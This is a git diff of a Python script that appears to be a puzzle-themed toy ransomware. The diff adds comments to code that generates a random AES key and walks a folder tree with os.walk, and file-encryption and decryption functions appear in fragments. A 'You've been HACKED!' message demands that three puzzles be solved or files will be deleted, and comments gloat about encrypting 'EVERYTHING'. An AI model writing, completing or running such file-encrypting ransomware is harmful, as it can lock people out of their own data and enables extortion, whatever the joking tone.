@@ -6,6 +6,12 @@ from Crypto.Cipher import AES
 from pprint import pprint
 import sys
 
+"""
+encrypt_file
+This is the encrypt file function, where we use AES encryption to encrypt the file.
+The code is simple to understand, we use the key given, generate an IV and use these to
+run the AES encryption function
+"""
 def encrypt_file(key, in_filename):
     out_filename = os.path.splitext(in_filename)[0]
     out_filename = out_filename + '.enc'
@@ -26,7 +32,10 @@ def encrypt_file(key, in_filename):
                     chunk += (' ' * (16 - len(chunk) % 16)).encode('utf-8')
 
                 outfile.write(encryptor.encrypt(chunk))
-
+"""
+decrypt_file
+This is the decrypt file function, where we use the IV and the key to decrypt the file
+"""
 
 def decrypt_file(key, in_filename):
     chunksize=24*1024
@@ -44,7 +53,10 @@ def decrypt_file(key, in_filename):
                     break
                 outfile.write(decryptor.decrypt(chunk))
             outfile.truncate(origsize)
-
+"""
+puzzleOne
+A simple puzzle, one of three which you need to solve to decrypt all your files
+"""
 
 def puzzleOne():
     answer = ""
@@ -69,6 +81,11 @@ def puzzleOne():
                     print("Invalid Input")
     return 0;
 
+"""
+puzzleTwo
+The second puzzle, one step closer to decryption!
+"""
+
 def puzzleTwo():
     answer = ""
     check = 0
@@ -91,6 +108,10 @@ def puzzleTwo():
                 else:
                     print("Invalid Input")
     return 0;
+"""
+puzzleThree
+The final puzzle, solve this and your files will be free!!
+"""
 
 def puzzleThree():
     answer = ""
@@ -130,6 +151,9 @@ print("Running folder scan on " + start_path)
 
 dir_list = []
 file_list = []
+"""
+Here, we walk through all your files and folders, and encrypt EVERYTHING. MUAHHAHAHHAAA!
+"""
 key  = ''.join(random.choice('0123456789abcdef') for n in range(32))
 for root, dirs, files in os.walk(start_path):
     for name in files:
@@ -141,11 +165,15 @@ for root, dirs, files in os.walk(start_path):
     for name in dirs:
         dir_list.append(os.path.join(root, name))
 
-print("\nDirectories:")
+#print("\nDirectories:")
 #print(dir_list)
-print("\nFolders:")
+#print("\nFolders:")
 #pprint(file_list)
 
+"""
+Now that our evil plan has been executed, we will give you peasants a chance to redeem yourselves.
+Go ahead and crack these impenetrable defenses(actually very cute puzzles)
+"""
 
 num = 0;
 print("You've been HACKED! \nSoRrY bUt AlL yOuR fIlEs HaVe bEeN eNcRyPtEd. \nIf YoU wAnT tHeM bAcK, sOlVe thEsE pUzZleS. OThErwIse, wE'lL delEte EveRytHinG!")
